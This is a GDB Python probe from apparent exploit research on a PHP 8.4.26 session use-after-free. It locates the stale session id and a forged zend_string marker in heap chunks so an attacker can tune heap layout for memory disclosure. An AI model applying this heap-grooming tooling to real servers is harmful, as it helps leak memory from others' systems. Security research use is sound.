# b1_id_page.gdb - where is the forged value relative to the stale session id?
#
# On 8.4.26 the disclosure works because the forged zend_string header lands one page above the stale
# id, so the first function that dereferences PS(id) (ps_close_files, from ps_open_files) reads our
# bytes instead of freed memory, and the encode that follows reads them with our length.
#
# When the geometry is wrong the request dies inside ps_close_files with SIGSEGV, which makes the
# encoder breakpoint useless: it is never reached. This probe stops earlier, at the first use of the
# stale id, and reports the two numbers the geometry actually needs:
#
#   the page of PS(id) inside its chunk      (the target page)
#   the pages of that chunk holding our value marker  (where the forge currently lands)
#
#   sudo gdb -q -batch -p <worker> -x gdb/b1_id_page.gdb &
#   python3 poc/b1_forge.py --url ... --spec ...      # the request that stops at the breakpoint
set pagination off
set confirm off
set width 0

python
import gdb

CHUNK = 0x200000
PS_ID = 0x10
MARKER = bytes.fromhex("2f39394242424242")   # "/99BBBBB", the default data-head of the forge


def q(inf, addr):
    return int.from_bytes(inf.read_memory(addr, 8).tobytes(), "little")


class IdPage(gdb.Breakpoint):
    def stop(self):
        inf = gdb.selected_inferior()
        try:
            ps = int(gdb.parse_and_eval("(unsigned long)&ps_globals"))
            psid = q(inf, ps + PS_ID)
        except Exception as exc:
            print("[id] ps_globals unreadable: %s" % exc)
            return True
        if not psid:
            print("[id] PS(id) is NULL - the arming did not survive")
            return True

        chunk = psid & ~(CHUNK - 1)
        print("[id] PS(id)=%#x  chunk=%#x  page=%#x" % (psid, chunk, (psid & (CHUNK - 1)) >> 12))

        try:
            blob = inf.read_memory(chunk, CHUNK).tobytes()
        except Exception as exc:
            print("[id] chunk unreadable: %s" % exc)
            return True
        pages = [off >> 12 for off in range(0, len(blob) - len(MARKER), 8)
                 if blob[off:off + len(MARKER)] == MARKER]
        if pages:
            print("[id] value marker in this chunk: first=%#x last=%#x count=%d"
                  % (pages[0], pages[-1], len(pages)))
            near = [p for p in pages if abs(p - ((psid & (CHUNK - 1)) >> 12)) <= 4]
            print("[id] pages within 4 of the id page: %s"
                  % (" ".join("%#x" % p for p in near) or "none"))
        else:
            print("[id] value marker is NOT in the stale-id chunk")

        # Where does it land instead? Chunks are mmap'd contiguously, so scan the neighbourhood and
        # report the distance in chunks - that is the number a filler parameter has to move.
        found = []
        for delta in list(range(-16, 0)) + list(range(1, 17)):
            other = chunk + delta * CHUNK
            try:
                other_blob = inf.read_memory(other, CHUNK).tobytes()
            except Exception:
                continue
            hits = [off >> 12 for off in range(0, len(other_blob) - len(MARKER), 8)
                    if other_blob[off:off + len(MARKER)] == MARKER]
            if hits:
                found.append((delta, hits[0], hits[-1], len(hits)))
        if found:
            print("[id] marker found in neighbouring chunks (+/-16 chunks):")
            for delta, first, last, count in found:
                print("[id]   %+d chunk(s): pages %#x..%#x, %d markers"
                      % (delta, first, last, count))
        else:
            print("[id] marker not in +/-16 chunks either")
        return True


IdPage("ps_close_files", internal=False)
end

continue
